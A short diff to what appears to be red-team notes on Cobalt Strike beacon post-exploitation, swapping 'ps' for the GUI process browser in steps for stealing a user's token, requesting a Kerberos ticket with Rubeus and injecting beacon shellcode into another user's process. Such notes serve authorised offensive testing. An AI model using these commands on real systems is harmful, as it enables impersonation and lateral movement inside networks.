@@ -53,7 +53,7 @@ beacon> rev2self
 ```cs
 // OPSEC-SAFE — requires HIGH-INTEGRITY session
 // Step 1 — identify target process running as desired user
-beacon> ps
+beacon> process_browser     // GUI tab — find process owned by target user, right-click → steal token
 
 // Step 2 — steal token from that PID
 beacon> steal_token <PID>
@@ -192,7 +192,7 @@ beacon> execute-assembly Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /rc4
 ```cs
 // Requires HIGH-INTEGRITY session
 // Step 1 — find process owned by target user
-beacon> ps
+beacon> process_browser     // GUI tab — find process owned by target user, right-click → steal token
 
 // Step 2 — inject beacon shellcode into that process
 // New beacon session runs in target process address space = target user context
